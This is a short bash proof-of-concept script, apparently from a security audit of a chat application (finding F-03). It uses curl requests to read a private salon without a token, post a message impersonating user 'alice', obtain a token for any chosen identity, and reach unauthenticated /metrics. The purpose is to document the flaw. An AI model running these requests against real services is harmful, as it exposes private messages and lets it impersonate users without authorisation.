#!/usr/bin/env bash
# Preuve F-03 : les routes REST accedent aux salons prives sans aucun jeton.
# Usage : bash audit/preuve-f03-rest-sans-autorisation.sh [url]
set -u
URL="${1:-http://localhost:3010}"

echo "--- 1. le salon 'dev' est bien declare prive"
curl -s "$URL/api/salons" | python3 -c "import sys,json;print([s for s in json.load(sys.stdin) if s['id']=='dev'])"

echo "--- 2. lecture du salon prive SANS jeton"
curl -s -w "\n[HTTP %{http_code}]\n" "$URL/api/salons/dev/messages"

echo "--- 3. ecriture dans le salon prive SANS jeton, en usurpant alice"
curl -s -X POST "$URL/api/salons/dev/messages" \
  -H 'Content-Type: application/json' \
  -d '{"auteur":"alice","texte":"preuve audit S8 - injecte sans authentification"}' \
  -w "\n[HTTP %{http_code}]\n"

echo "--- 4. le jeton est delivre a quiconque, avec l'identite demandee"
curl -s "$URL/api/dev-token?pseudo=alice" | python3 -c "import sys,json;print(json.load(sys.stdin))"

echo "--- 5. /metrics sans authentification"
curl -s -o /dev/null -w "GET /metrics -> HTTP %{http_code}\n" "$URL/metrics"
